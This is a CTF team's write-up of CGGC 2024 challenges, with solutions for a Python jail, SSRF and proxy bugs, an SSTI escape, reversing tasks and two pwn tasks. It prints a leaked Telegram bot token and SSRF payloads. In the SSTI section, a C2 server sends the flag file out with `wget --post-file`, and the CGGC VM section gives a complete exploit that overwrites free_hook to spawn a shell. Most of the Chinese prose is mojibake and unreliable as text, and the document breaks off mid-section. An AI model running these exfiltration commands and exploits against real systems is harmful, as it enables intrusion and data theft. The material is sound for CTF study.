# CGGC 2024
###### tags: `CTF`

Player: 
- ywc
- MuMu
- Pierre
- AxelHowe

---
- [ctfd](http://10.99.66.1/)
- Teamname: `i'm down QQ`
- Rank: 4/121
- Solve: 10/12

![Imgur](https://imgur.com/2ctcXv5.png)

## Misc
### Day31- æ°´è½çŸ³å‡ºï¼çœŸç›¸å¤§ç™½çš„åä¸€æœˆé å‘Šä¿¡ï¼Ÿ

There's a tag `info leak` with this challenge, after we search the full 30days in iThome, we will get a telegram bot API secret  
`https://api.telegram.org/bot7580842046:AAEKmOz8n3C265m2_XSv8cGFbBHg7mcnbMM/sendPhoto`, which can be abused at searching history in the bot channel.

```python
import requests

# Replace with your actual bot token
bot_token = "7580842046:AAEKmOz8n3C265m2_XSv8cGFbBHg7mcnbMM"
base_url = f"https://api.telegram.org/bot{bot_token}"

# Example 1: Get Bot Information
response = requests.get(f"{base_url}/getMe")
print("Bot Info:", response.json())

# Example 2: Get Updates (Messages sent to the bot)
response = requests.get(f"{base_url}/getUpdates")
print("Updates:", response.json())
```

![Imgur](https://imgur.com/EsgjmTY.png)
flag: `CGGC{1_h8t3_y0u_K41d0_K4zm4}`   
I hate fucking OSINT, too.

### BreakJail
Source code
```python
#!/usr/local/bin/python3
print(open(__file__).read())

flag = open('flag').read()
flag = "Got eaten by the cookie monster QQ"

inp = __import__("unicodedata").normalize("NFKC", input(">>> "))

print(dir(__import__("GoodPdb").good_breakpoint))
if any([x in "._." for x in inp]) or inp.__len__() > 55:
    print('bad hacker')
else:
    print(
            eval(inp, {"__builtins__": {}}, {
         'breakpoint': __import__('GoodPdb').good_breakpoint})
            )

print(flag)
```

Code in comment mention that it's patched from the other source, so let's diff to check the changelog.

```diff
--- origin.py   2024-11-02 14:51:02.053995600 +0800
+++ GoodPdb.py  2024-11-02 15:31:57.380265900 +0800
@@ -1,7 +1,8 @@
-#!/usr/bin/python3.10 -W ignore
 import pdb

 class GoodPdb(pdb.Pdb):
+
+
     def cmdloop(self, intro=None):
         """Repeatedly issue a prompt, accept input, parse an initial prefix
         off the received input, and dispatch to action methods, passing them
@@ -38,7 +39,11 @@
                 else:
                     if self.use_rawinput:
                         try:
-                            line = input(self.prompt)
+                            """
+                            no interactive!
+                            """
+                            # line = input(self.prompt)
+                            line = "EOF"
                         except EOFError:
                             line = 'EOF'
                     else:
@@ -60,3 +65,12 @@
                     readline.set_completer(self.old_completer)
                 except ImportError:
                     pass
+
+    def do_interact(self, arg):
+        """
+        no interactive!
+        """
+        pass
+
+
+good_breakpoint = GoodPdb().set_trace
```

Modified version cancelled the interactive loop with user, so we need to interactive with breakpoint in another way.  
First important section mentioned in [python3.14 document](https://docs.python.org/3.14/library/pdb.html#debugger-commands), breakpoint allow to input debugger commands without interactive with raw_input.  
Second, we have no built-in functions to use, so top priority is to escape the eval function.   
1. Use `n;;n` to get out the position of eval local frame, notice eval is divied to 2 lines so we should next 2 steps
2. `j 4` back to above read flag
3. `n` for executing read flag
4. `p flag` get the `flag` variable in current frame.

![Imgur](https://imgur.com/xNSiqdB.png)

BTW, this [YouTube video](https://www.youtube.com/watch?v=tCs6rWpI0IM) describes technology details about pdb from the python core developer `gaotian`.

## Web
### Preview Site ğŸ”

flag åœ¨ filesystem çš„ `/flag`

`/fetch` æœ‰ SSRF æ¼æ´ï¼Œä½†æœƒæª¢æŸ¥ url å‰ç¶´æ˜¯ä¸æ˜¯ `http://previewsite/`ï¼Œçœ‹èµ·ä¾†ç¹ä¸é

```python
if not url.startswith(os.getenv("DOMAIN", "http://previewsite/")):
    raise ValueError('badhacker')
resp = send_request(url)
```

ä¸é request å¯ä»¥æ¥å— redirectï¼Œå› æ­¤é–‹å§‹æ€è€ƒç¶²ç«™æœ‰æ²’æœ‰ open redirect ä¹‹é¡çš„æ¼æ´

```python
def send_request(url, follow=True):
    try:
        response =  urllib.request.urlopen(url)
    except urllib.error.HTTPError as e:
        response = e
    redirect_url = response.geturl()
    if redirect_url != url and follow:
        return send_request(redirect_url, follow=False)
    return response.read().decode('utf-8')
```

login æœ‰ open redirect æ¼æ´ï¼Œä½†æ˜¯è¦ç”¨ POST æ‰“ username å’Œ passwordï¼Œé›£ä»¥åˆ©ç”¨

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    next_url = request.args.get('next', url_for('index'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if users.get(username) == password:
            session['username'] = username
            flash('login success')
            return redirect(next_url)
        else:
            error = 'login failed'
            return render_template('login.html', error=error, next=next_url)
    return render_template('login.html', next=next_url)
```

å¯åˆ©ç”¨çš„é»åœ¨ logoutï¼Œä¸€æ¨£æ˜¯ open redirect æ¼æ´ï¼Œä¸éå¯ä»¥ä½¿ç”¨ GET

```python
@app.route('/logout')
def logout():
    session.pop('username', None)
    next_url = request.args.get('next', url_for('index'))
    return redirect(next_url)
```

payload: `http://previewsite/logout?next=file:///flag`

`CGGC{open_redirect_to_your_local_file_2893hrgiubf3wq1}`

### proxy

source:

```php
<?php

function proxy($service) {
    // $service = "switchrange";
    // $service = "previewsite";
    // $service = "è¶Šç„";
    $requestUri = $_SERVER['REQUEST_URI'];
    $parsedUrl = parse_url($requestUri);

    $port = 80;
    if (isset($_GET['port'])) {
        $port = (int)$_GET['port'];
    } else if ($_COOKIE["port"]) {
        $port = (int)$_COOKIE['port'];
    }
    setcookie("service", $service);
    setcookie("port", $port);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $filter = '!$%^&*()=+[]{}|;\'",<>?_-/#:.\\@';
    $fixeddomain = trim(trim($service, $filter).".cggc.chummy.tw:".$port, $filter);
    $fixeddomain = idn_to_ascii($fixeddomain);
    $fixeddomain = preg_replace('/[^0-9a-zA-Z-.:_]/', '', $fixeddomain);
    curl_setopt($ch, CURLOPT_URL, 'http://'.$fixeddomain.$parsedUrl['path'].'?'.$_SERVER['QUERY_STRING']);
    curl_exec($ch);
    curl_close($ch);
}

if (!isset($_GET['service']) && !isset($_COOKIE["service"])) {
    highlight_file(__FILE__);
} else if (isset($_GET['service'])) {
    proxy($_GET['service']);
} else {
    proxy($_COOKIE["service"]);
}
```

åœ¨ args ä¸­å¯ä»¥è¨­å®š service, port ç­‰åš SSRFï¼Œä½† service åªèƒ½æŒ‡å®š `cggc.chummy.tw` åº•ä¸‹çš„ subdomain

æ¼æ´çš„é»åœ¨ `idn_to_ascii` å‡½å¼ï¼Œå¯¦éš›æ¸¬è©¦ç™¼ç¾è¶…é url å¤§å° (63 å­—å…ƒ) æ™‚å›å‚³å€¼æœƒæ˜¯ç©ºçš„ï¼Œå› æ­¤å°±æœƒè®Šæˆå­˜å– `http:///<path>?<querystring>`

è¨­å®š path ç‚ºè¦å­˜å–çš„ç¶²ç«™ï¼Œå³å¯ SSRF

payload: `/secretweb/flag?service=<ä¸€å€‹å¾ˆé•·çš„å­—ä¸²>`

`CGGC{1Dn_7O_45c11_5o_57R4n9E_11fc26f06c33e83f65ade64679dc0e58}`

### BreakJail Online

```python
@app.route('/SsTiMe', methods=['GET'])
def showip():
    # WOW! There has a SSTI in Flask!!!
    q = request.args.get('q', "'7'*7")

    # prevent smuggling bad payloads!
    request.args={}
    request.headers={}
    request.cookies={}
    request.data ={}
    request.query_string = b"#"+request.query_string

    if any([x in "._.|||" for x in q]) or len(q) > 88:
        return "Too long for me :/ my payload less than 73 chars"

    res = render_template_string(f"{{{{{q}}}}}",
        # TODO: just for debugging, remove this in production
        breakpoint=breakpoint,
        str=str
    )

    # oops, I just type 'res' not res qq
    return 'res=7777777'
```

é¡Œç›®è¦æ±‚
- ä¸èƒ½ä½¿ç”¨ `.` `_` `|`
- é•·åº¦ <= 88
- æ¸…ç©º request éƒ¨åˆ†è³‡è¨Š
- python3.140a1

å› ç‚ºåœ¨ render_template ä¸­å…è¨±ä½¿ç”¨ breakpointï¼Œè€Œ 3.14.0a1 çš„ breakpoint ä¸­å¯ä»¥ä½¿ç”¨ `commands` æŒ‡å®šåŸ·è¡Œçš„ breakpoint commandï¼Œå¯ä»¥åœ¨è£¡é¢åŸ·è¡Œ python

ä¸€å€‹åšæ³•æ˜¯åœ¨è£¡é¢ç”¨ os.systemï¼Œä½†å› ç‚ºé•·åº¦é™åˆ¶å’Œæ²’æœ‰å›é¡¯çš„é—œä¿‚ï¼Œå› æ­¤æ¡ç”¨ `wget` ä¸‹è¼‰ sh æŒ‡ä»¤ç¢¼åŸ·è¡Œ (æ²’æœ‰ `nc`, `curl` ç­‰ï¼Œå› æ­¤ç„¡æ³•ç›´æ¥ nc é€çµæœå‡ºå»)

ä¸‹è¼‰æŒ‡ä»¤ payload (`<ip>` çš„åœ°æ–¹æ˜¯ C2 çš„ IPï¼Œé»ä½¿ç”¨ `\x2e` bypass filter):

```!
/SsTiMe?q=breakpoint(commands=["import os;os\x2esystem('wget <ip>:8000/y');;c"])
```

C2 server (`<ip>` çš„åœ°æ–¹æ˜¯ C2 çš„ IP):
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/y')
def hello_world():
    return 'wget --post-file=`ls /f*` <ip>:8081'

if __name__ == '__main__':
    app.run('0.0.0.0', 8000)
```

åŸ·è¡ŒæŒ‡ä»¤

```!
/SsTiMe?q=breakpoint(commands=["import os;os\x2esystem('sh y');;c"])
```

`CGGC{breakpoint_is_a_biiiig_gadget_oj237rpwd3i2}`

å¦‚æœé‡åˆ°é•·åº¦å•é¡Œå¯ä»¥ç”¨å…«é€²ä½çš„å½¢å¼æ¸›å°‘ä½¿ç”¨ `\x2e`  
æˆ–æ˜¯ç”¨é‡è¦†å¯«æª”æ§‹å»º script

## Reverse
### Lazy7


é€™é¡Œå…¶å¯¦å°±æ˜¯å¯¦ä½œäº† lz77 å£“ç¸®æ¼”ç®—æ³•ï¼Œç”¨ IDA è§€å¯Ÿæœƒåšå£“ç¸®ä¸¦æ›¿æ›éƒ¨åˆ†çš„ byteï¼Œé‡è¤‡å…©æ¬¡
![Imgur](https://imgur.com/8eFSJOT.png)

æ‰€ä»¥åªè¦å°‡æ›¿æ› byte çš„éƒ¨åˆ†é‚„åŸï¼Œä¸”å¯¦ä½œè§£å£“ç¸®çš„éƒ¨åˆ†ï¼Œå°±æœƒå¾—åˆ°ä¸€ä¸² base64 ç·¨ç¢¼ï¼Œè§£ç¢¼å¾Œå°±æœƒæ˜¯ä¸€å¼µ png åœ–ç‰‡

![Imgur](https://imgur.com/qh8XHjc.png)



```python
import base64


def base64_to_png(base64_str, output_file):

    if base64_str.startswith('data:image/png;base64,'):
        base64_str = base64_str.split(',')[1]

    image_data = base64.b64decode(base64_str)

    with open(output_file, 'wb') as f:
        f.write(image_data)

def decompress(compressed_data, num_entries):
    output = []
    output_pos = 0

    for i in range(0, num_entries):
        # Extract the distance, length, and next character from the compressed data
        offset = int.from_bytes(compressed_data[i * 12:i * 12 + 4], 'little')  # Distance to match
        length = int.from_bytes(compressed_data[i * 12 + 4:i * 12 + 8], 'little')  # Length of match
        next_char = compressed_data[i * 12 + 8: i * 12 + 9].decode('utf-8')  # Next unmatched character
        
        if length == 0:
            # No match, just add the literal character
            output.append(next_char)
            output_pos += 1
        else:
            # Copy match from the output using the offset
            for _ in range(length):
                start_index = output_pos - offset
                output.append(output[start_index])
                output_pos += 1
            # Append the next character after match
            if next_char != '':
                output.append(next_char)
                output_pos += 1
    
    return ''.join(output)

def assemble_hex(data:str) -> bytes:
    output = ""
    for i in range(0, len(data), 10):
        b1 = data[i:i+2]
        b2 = data[i+2:i+4]
        b3 = data[i+4:i+6]
        b4 = data[i+6:i+8]
        b5 = data[i+8:i+10]

        output += f"{b2}{b1}0000{b4}{b3}0000{b5}000000"

    return bytes.fromhex(output)

if __name__ == "__main__":

    f = open("./test.txt", "r").read().split("Output Data: ")[1]

    print("len(f): ", len(f))
    print("f: ", f)
    if len(f) % 10 != 0:
        print('error: len(f) % 10 != 0')
        exit(0)
    tmp2 = assemble_hex(f)

    decomp2 = decompress(tmp2, len(tmp2) // 12)
    print('decomp2: ')
    print(decomp2)

    
    decomp2 = decomp2[:-1] # å¥½åƒå¾Œé¢æœ‰å¤šé¤˜çš„å­—å…ƒ
    print('len(decomp2): ', len(decomp2))
    if len(decomp2) % 10 != 0:
        print('error: len(decomp2) % 10 != 0')
        exit(0)

    tmp = assemble_hex(decomp2)

    decomp = decompress(tmp, len(tmp) // 12)
    print('decomp: ')
    print(decomp)

    base64_string = decomp
    output_filename = 'flag.png'
    base64_to_png(base64_string, output_filename)
    # CGGC{G00d_n3w5_Y0ur3_n0t_l4zy!}
```


### UnityFlagChecker

ç¨‹å¼æ˜¯ç”¨ il2cpp åŒ…çš„ï¼Œå¯ä»¥ç”¨ https://github.com/djkaty/Il2CppInspector æ‹†ï¼Œä½†æ‹†å‡ºä¾†æ²’æœ‰ source code åªæœ‰ structureï¼Œå› æ­¤è¦é€²ä¸€æ­¥åˆ†æ

æœ‰ä¸€å€‹ checkstring `utfqqa7by/VSLA28KYr2W9rsheykILbRStSNO09I5E3elYlOAn3gTwjLOG27TuVzccgx+JMO`ï¼Œæ¨æ¸¬æ˜¯ ciphertext

![Imgur](https://imgur.com/tgeRSwS.png)

å¦å¤–åœ¨ level 0 è£¡é¢æœ‰ç™¼ç¾ key å’Œ ivï¼Œé•·åº¦å°å¾—ä¸Š chacha20 çš„è¨­å®š

é›–ç„¶æœ‰ ciphertextã€key å’Œ ivï¼Œä½†æ˜¯ç„¡æ³•è§£å¯†ï¼Œå¯èƒ½åœ¨ç¨‹å¼ä¸­ä½¿ç”¨æ”¹éçš„ chacha20 ç®—æ³•

è§£æ³•æ˜¯ä½¿ç”¨åƒè€ƒ [frida bridge hook](https://github.com/ChuJiani/frida-il2cpp-bridge-template) ä¸Šé¢çš„å‡½å¼ï¼Œå°‡ flag è¨­å®šå›å»ï¼Œç”±æ–¼ chacha20 æ˜¯å°ç¨±å¼åŠ å¯†çš„é—œä¿‚å› æ­¤åŠ å¯†ç­‰åŒæ–¼è§£å¯†ï¼Œå°‡è®Šæ•¸æŒ‡å®šå¥½ä¹‹å¾ŒåšåŠ å¯†å³å¯æ‹¿åˆ°æ˜æ–‡  
æ³¨æ„è¼¸å…¥çš„å¤§å°è¦è·Ÿ checkstring çš„ 54 ä¸€æ¨£é•·ï¼Œä¸ç„¶ buffer å¤§å°ä¸åŒæœƒå£æ‰  
å…¶é¤˜ function ä¸»è¦æ˜¯å‹•æ…‹è¿½è¹¤ä½¿ç”¨åˆ°çš„ function

Test script
```typescript
import "frida-il2cpp-bridge";

Il2Cpp.perform(() => {
  /* dump all function calls */
  /*
  Il2Cpp.trace()
     .assemblies(Il2Cpp.domain.assembly('Assembly-CSharp'))
     .and()
     .attach();
    //*/

  /* dump encryption related function calls and their arguments / return values */
  /*
  Il2Cpp.trace(true)
     .assemblies(Il2Cpp.domain.assembly('Assembly-CSharp'))
     .filterClasses(klass => klass.name == 'Calcer')
     .and()
     .attach();
//*/
  //*
  const mscorlib = Il2Cpp.domain.assembly("mscorlib").image;
  const AssembyCSharp = Il2Cpp.domain.assembly('Assembly-CSharp').image;

  const Calcer = AssembyCSharp.class("Calcer");
  const CalcerWorkBytes = Calcer.method<void>("WorkBytes");

  const flag = [186,215,234,169,174,219,203,245,82,44,13,188,41,138,246,91,218,236,133,236,164,32,182,209,74,212,141,59,79,72,228,77,222,149,137,78,2,125,224,79,8,203,56,109,187,78,229,115,113,200,49,248,147,14];
  
//*/

  // @ts-ignore
  //*
  CalcerWorkBytes.implementation = function(output: Il2Cpp.Array, input: Il2Cpp.Array, numBytes: number): void {
    for (let i = 0; i < numBytes; ++i) {
      input.set(i, flag[i]);
   }
    this.method<void>("WorkBytes").invoke(output, input, numBytes);
    console.log(output);
 }
  //*/
});
```

![Imgur](https://imgur.com/82Snbax.png)

### Very secure

æ ¹æ“šé¡Œç›®ä»¥åŠ strings çµæœæ¨è«– `flash.bin` ç‚º ESP-IDF æ¡†æ¶çš„ firmwareï¼Œåˆ©ç”¨ä¿®æ”¹å¾Œçš„ [esp32_image_parser](https://github.com/tenable/esp32_image_parser) å¯ä»¥ dump å‡ºä¸‰å€‹ partition å…¶ä¸­ `nvs` èˆ‡ `phy_init` ç‚ºç©ºï¼Œå›º `factory` ç‚ºåˆ†æä¹‹é‡é»ã€‚

![Imgur](https://imgur.com/LBWHDSm.png)

åˆ©ç”¨ ghidra é€†å‘çš„çµæœå¯ç”± `a very secure string` å­—ä¸²è¿½å›æ¨è«–æ˜¯ handle get request path çš„å‡½å¼éƒ¨åˆ†

![Imgur](https://imgur.com/FQEjwm8.png)

`FUN_400d8dcc` å°±æ˜¯è§£ flag çš„ä½ç½®

`DAT_3f41015c = b'\x02\x06\x06\x02\x3a\x28\x71\x35\x1e\x20\x33\x72\x1e\x37\x24\x33\x38\x1e\x32\x24\x22\x34\x33\x24\x3c\x00\x00\x00'`

èˆ‡ 'A' xor å°±å¯ä»¥è§£å‡º flag

![Imgur](https://imgur.com/XDcb8oS.png)

`CGGC{i0t_ar3_very_secure}`

## Pwn
### CGGC VM

ç¨‹å¼æœ‰ä¸‰å€‹åŠŸèƒ½ `input opcode`, `execute opcode` å’Œ `exit`

![Imgur](https://imgur.com/P0mBAaR.png)

input opcode æœƒè¦æ±‚è®€å…¥æœ‰å¤šå°‘ opcode å’Œæ¯å€‹æŒ‡ä»¤ï¼Œå„²å­˜æŒ‡ä»¤çš„ ptr æœƒä½¿ç”¨ malloc ç”Ÿæˆï¼Œæ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯å¦‚æœåš input opcode è¦æ±‚çš„å¤§å°èˆ‡ä¸Šæ¬¡ä¸åŒï¼Œå‰‡æœƒé€²è¡Œ free å† malloc

![Imgur](https://imgur.com/4wemWqR.png)

execute opcode æœƒè®€å–å…ˆå‰è¼¸å…¥çš„æŒ‡ä»¤ï¼Œä¸¦æ ¹æ“š opcode åšç›¸é—œçš„è¡Œç‚ºï¼ŒåŒ…å« register, memory, stack ä¹‹é¡çš„æ“ä½œ

![Imgur](https://imgur.com/tuIR3qi.png)
![Imgur](https://imgur.com/w8atuiM.png)

bye çš„éƒ¨åˆ†æ˜¯å–®ç´”çš„ freeï¼Œæ²’æœ‰çœŸçš„é›¢é–‹ç¨‹å¼

![Imgur](https://imgur.com/BkuoC4P.png)

ç¨‹å¼ä¿è­·å…¨é–‹

![Imgur](https://imgur.com/Qf0qOD7.png)

æ¼æ´çš„é»åœ¨æ–¼ `0xc` å’Œ `0xd` çš„ opcode (push, pop) æ²’æœ‰æª¢æŸ¥ `sp_4050` æ˜¯ä¸æ˜¯è¶…å‡ºç¯„åœï¼Œå¯ä»¥é€²è¡Œ OOB read / write

global variable çš„ layout å¤§æ¦‚é•·é€™æ¨£

```
.data:0000000000004000 _data
.data:0000000000004008 __dso_handle
LOAD:0000000000004010 ???
.bss:0000000000004020 stdout@@GLIBC_2_2_5
.bss:0000000000004028 <align>
.bss:0000000000004030 stdin@@GLIBC_2_2_5
.bss:0000000000004038 <align>
.bss:0000000000004040 stderr@@GLIBC_2_2_5
.bss:0000000000004048 completed_8061
.bss:0000000000004050 sp_4050
.bss:0000000000004058 <align>
.bss:0000000000004060 mem     dq     1000h
.bss:000000000000C060 ops
.bss:000000000000C068 ptr
.bss:000000000000C070 <align>
.bss:000000000000C080 reg     dq     100h
.bss:000000000000C880 stack   dq     1000h
```

åœ¨ `stdin`, `stdout`, `stderr` çš„åœ°æ–¹å¯ä»¥è®€å–åˆ° libc ä¸Šçš„ä½ç½®ï¼Œåœ¨ `ptr` ä¸Šå¯ä»¥è®€å–åˆ° heap ä¸Šçš„ä½ç½®ï¼Œåœ¨ `__dso_handle` å¯ä»¥è®€å–åˆ° data å€æ®µä¸Šçš„ä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨å‰é¢çš„ OOB read ä¾† leak

ç•¶æœ‰äº† codebase, libcbaseï¼Œå¯ä»¥å¾—å‡º libc `freehook` èˆ‡ `stack` çš„ä½ç½®ï¼Œå°±å¯ä»¥é€éä¿®æ”¹ `sp_4050` è®Šæˆç›¸å°çš„ offset ä½¿å¾—ä¸‹ä¸€æ¬¡åš push stack çš„ opcode æ™‚å¯ä»¥ä¿®æ”¹ freehook çš„å€¼ï¼Œå¯«æˆ systemï¼Œä¸¦è§¸ç™¼ freeï¼Œå³å¯ get shell

ç­–ç•¥æ•´ç†å¦‚ä¸‹

1. OOB readï¼Œleak `ptr` æ‹¿ heapbase (é›–ç„¶äº‹å¾Œç™¼ç¾ä¸éœ€è¦)
2. OOB readï¼Œleak `stdout` å’Œ `__dso_handle`ï¼Œå¾—åˆ° libcbase, codebaseï¼Œä¸¦å°‡ `sp_4050` èª¿æ•´åˆ° `sp_4050` çš„ offset
3. æŠŠ `sp_4050` æ”¹æˆ free hook çš„ offsetï¼Œå¯« free hook
4. è§¸ç™¼ free_hook

ä»¥ä¸‹æ˜¯å®Œæ•´çš„ exploit

```python
from pwn import *
binary = "./chal"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("10.99.66.2", 1337)
# conn = process(binary)
# conn = gdb.debug(binary, "set solib-search-path ./libc.so.6")

def read_opcode(size, data):
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b'Size: ', str(size).encode())
    conn.recvuntil(b'Opcodes: ')
    for d in data:
        conn.sendline(str(d).encode())

def execute_opcode():
    conn.sendlineafter(b'> ', b'2')

# chunk1 (leak ptr)
pop_r0 = u64(b'\x00\x00\x00\x00\x0d\x00\x00\x00'[::-1])
push_r1 = u64(b'\x00\x00\x00\x00\x0c\x00\x00\x01'[::-1]) # ops
print_r0 = u64(b'\x00\x00\x00\x00\x0b\x00\x00\x00'[::-1])

set_r1_265 = [
    u64(b'\x00\x00\x00\x00\x00\x01\x00\xff'[::-1]), # set r1 255
    u64(b'\x00\x00\x00\x00\x00\x02\x00\x0a'[::-1]), # set r2 10
    u64(b'\x00\x00\x00\x00\x01\x01\x01\x02'[::-1]), # add r1, r1, r2
]

context.log_level = "info"
read_opcode(260+1+3+1, [pop_r0] * 260 + [print_r0] + set_r1_265 + [push_r1])
context.log_level = "debug"
execute_opcode()

leak = int(conn.recvline().strip().decode().split(":")[1]) # heap
print(f"leak: {hex(leak)}")
heapbase = leak - 0x2d0
print(f"heapbase: {hex(heapbase)}")

# chunk2 (leak libc, codebase)
pop_r0 = u64(b'\x00\x00\x00\x00\x0d\x00\x00\x00'[::-1])
pop_r1 = u64(b'\x00\x00\x00\x00\x0d\x00\x00\x01'[::-1])
pop_r2 = u64(b'\x00\x00\x00\x00\x0d\x00\x00\x02'[::-1])
pop_r3 = u64(b'\x00\x00\x00\x00\x0d\x00\x00\x03'[::-1])
pop_r4 = u64(b'\x00\x00\x00\x00\x0d\x00\x00\x04'[::-1])
push_r1 = u64(b'\x00\x00\x00\x00\x0c\x00\x00\x01'[::-1]) # stderr
push_r2 = u64(b'\x00\x00\x00\x00\x0c\x00\x00\x02'[::-1]) # stdin
push_r3 = u64(b'\x00\x00\x00\x00\x0c\x00\x00\x03'[::-1]) # stdout
push_r4 = u64(b'\x00\x00\x00\x00\x0c\x00\x00\x04'[::-1]) # __dso_handle
push_r128 = u64(b'\x00\x00\x00\x00\x0c\x00\x00\x80'[::-1]) # always 0
print_r3 = u64(b'\x00\x00\x00\x00\x0b\x00\x00\x03'[::-1])
print_r4 = u64(b'\x00\x00\x00\x00\x0b\x00\x00\x04'[::-1])

context.log_level = "info"
read_opcode(0x1003+7+5+10, 
            [pop_r0] * 0x1003 + 
            [pop_r0, pop_r0, pop_r1, pop_r0, pop_r2, pop_r0, pop_r3] + 
            [pop_r0, pop_r0, pop_r4, print_r4, print_r3] + 
            [push_r128, push_r4, push_r128, push_r128, push_r3, push_r128, push_r2, push_r128, push_r1, push_r128]
)
context.log_level = "debug"
execute_opcode()

leak = int(conn.recvline().strip().decode().split(":")[1]) # bss
print(f"leak: {hex(leak)}")
codebase = leak - 0x4008
print(f"codebase: {hex(codebase)}")

leak = int(conn.recvline().strip().decode().split(":")[1]) # stdout
print(f"leak: {hex(leak)}")
libcbase = leak - 0x1ed6a0
print(f"libcbase: {hex(libcbase)}")

# chunk3 (modify free_hook)
print_r1 = u64(b'\x00\x00\x00\x00\x0b\x00\x00\x01'[::-1])
push_r1 = u64(b'\x00\x00\x00\x00\x0c\x00\x00\x01'[::-1])
def build_reg1(value) -> list:
    out = []
    value_base256 = []
    while value:
        value_base256.append(value & 0xff)
        value >>= 8
    out.append(u64(b'\x00\x00\x00\x00\x00\x01\x00\x00'[::-1])) #mov r1, 0
    for i,val in enumerate(value_base256):
        out.append(u64((b'\x00\x00\x00\x00\x00\x02\x00' + bytes([val]))[::-1])) #mov r2, val
        out.append(u64((b'\x00\x00\x00\x00\x00\x03\x00' + bytes([i*8]))[::-1])) #mov r3, i*8
        out.append(u64(b'\x00\x00\x00\x00\x05\x02\x02\x03'[::-1])) #lshift r2, r2, r3
        out.append(u64(b'\x00\x00\x00\x00\x01\x01\x01\x02'[::-1])) #add r1, r1, r2
    return out

# push to modify sp
free_hook = libcbase + 0x1eee48
stack = codebase + 0xc880
system = libcbase + 0x52290
build_reg1_0xdeadbeef = build_reg1((free_hook - stack) // 8)
build_reg1_system = build_reg1(system)
context.log_level = "info"
read_opcode(1 + len(build_reg1_0xdeadbeef) + 1 + 1 + len(build_reg1_system) + 1, 
            [u64(b'/bin/sh\x00')] + 
            build_reg1_0xdeadbeef + [push_r1] + [print_r0] + build_reg1_system + [push_r1])
context.log_level = "debug"
execute_opcode()

# chunk4 (next chunk)
conn.sendlineafter(b'> ', b'1')
conn.sendlineafter(b'Size: ', str(4).encode())

conn.interactive()
```

`CGGC{00b_l3ak_and_0v3rwr1t3_h00k}`

### oneshot

é¡Œç›®ä¸€é–‹å§‹å°±çµ¦ printf çš„ addressï¼Œç›´æ¥çœç•¥äº† leak libc çš„æ­¥é©Ÿï¼Œè€Œä¸”é‚„å¯ä»¥è¼¸å…¥ä»»ä¸€ addressï¼Œå†ç”¨ fget æ¥æ”¶é•·åº¦ 224 çš„ inputï¼Œå¯ä»¥ä»»æ„ä½ç½®å¯«å…¥

ä¸€é–‹å§‹æ˜¯åœ¨æƒ³æœ‰æ²’æœ‰æ©Ÿæœƒç”¨ one_gadget æ‹¿åˆ° shell æ¬Šé™ï¼Œä½†æ„Ÿè¦ºæ©Ÿç‡ä¸å¤§å°±æ²’æœ‰å˜—è©¦

å¾Œä¾†æˆ‘æ˜¯å…ˆç”¨ gdb æŸ¥çœ‹ vmmap ä¸­ libc çš„ `rw-`(å¯å¯«) å€æ®µï¼Œçœ‹çœ‹æœ‰æ²’æœ‰ä»€éº¼å¯ä»¥ä¿®æ”¹çš„æ±è¥¿ï¼Œå°±çœ‹åˆ°æœ‰ libc GOT è¡¨å¯å¯«ï¼Œå°±æƒ³åˆ°å¥½åƒå¯ä»¥æ”¹å¯« libc çš„ GOT è¡¨
![Imgur](https://imgur.com/N0mTRpt.png)

åƒè€ƒ [HackTricks](https://book.hacktricks.xyz/binary-exploitation/arbitrary-write-2-exec/www2exec-atexit#other-mangled-pointers-in-__run_exit_handlers) ä¹Ÿæœ‰æåˆ°å¯ä»¥æ”¹å¯« strlen çš„ GOT è¡¨å»æŒ‡å‘ system functionï¼Œä¸”é¡Œç›®åœ¨ fget ä¹‹å¾Œä¹Ÿå‰›å¥½æœ‰ call åˆ° puts function

> Strlen2system
Another common technique is to overwrite the `strlen` GOT address to point to `system`, so if this function is called with user input it's posisble to pass the string `"/bin/sh"` and get a shell.
Moreover, if `puts` is used with user input, it's possible to overwrite the `strlen` GOT address to point to `system` and pass the string `"/bin/sh"` to get a shell because `puts` will call `strlen` with the user input.

ä¸éå°±ç®—å¯ä»¥æ”¹å¯«åˆ° strlen çš„ GOT è¡¨ï¼Œä½†å»æ²’æœ‰ /bin/sh å¯ä»¥ç•¶åƒæ•¸ï¼Œæ‰€ä»¥åˆå¡äº†ä¸€é™£å­ï¼Œå¾Œä¾†ç™¼ç¾äº†é€™å€‹ [GitHub repo](https://book.hacktricks.xyz/binary-exploitation/arbitrary-write-2-exec/www2exec-atexit#other-mangled-pointers-in-__run_exit_handlers) èªªæ˜äº†é”æˆ libc ä»»æ„å¯«å¾Œï¼Œå¦‚ä½•æ”¹å¯« GOT è¡¨ï¼Œç›´æ¥æ‹¿åˆ° shell æ¬Šé™ï¼Œä¸”æª¢æŸ¥é¡Œç›®çš„ libc ç‰ˆæœ¬ä¹Ÿå‰›å¥½ <= 2.35ï¼Œ

é¡Œç›®æœ‰é™åˆ¶ payload çš„é•·åº¦ï¼Œä½†é‚„æ˜¯å¯ä»¥ç›´æ¥ç”¨ repo è£¡é¢çµ¦çš„ fx3 çš„ template å» get shell

ä½†æˆ‘ä¹‹å‰å° libc çš„ GOT è¡¨ä¸å¤ªç†Ÿæ‚‰ï¼Œç”¨ gdb è§€å¯Ÿä¹Ÿæ˜¯ä¸€å † `<*ABS*@got.plt>`ï¼Œçœ‹ä¸å‡ºå€‹æ‰€ä»¥ç„¶ï¼Œæ‰€ä»¥æˆ‘å°±ç”¨ gdb åˆ†æï¼Œç›´æ¥ si é€²å…¥ puts è§€å¯Ÿ strlen çš„ GOT åœ¨å“ªå€‹ address

ä¸‹é¢é€™è¡Œå°±æ˜¯åœ¨ call strlen functionï¼Œç¹¼çºŒ si å°±èƒ½æ‰¾åˆ° GOT çš„ address
```bash
0x7f9c5e95de63 <puts+19>        call   0x7f9c5e905490 *ABS*+0xa86a0@plt

